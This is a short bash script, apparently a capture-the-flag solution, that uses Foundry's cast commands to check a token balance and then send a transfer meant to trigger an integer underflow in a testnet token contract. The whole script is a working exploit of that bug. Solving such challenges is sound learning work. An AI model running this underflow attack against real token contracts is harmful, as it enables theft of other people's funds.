#!/bin/bash

# Finding the current balance of our account
cast call $TOKEN --rpc-url=$RINKERBY --private-key=$PRIVATE_KEY "balanceOf(address _owner)" 0x527B0642b3902C3Bc29ae13D8208b86dA007aa26

# Sending a transaction to cause an underflow 
cast send $TOKEN --rpc-url $RINKERBY --private-key $PRIVATE_KEY "transfer(address _to, uint _value)" $TOKEN 21
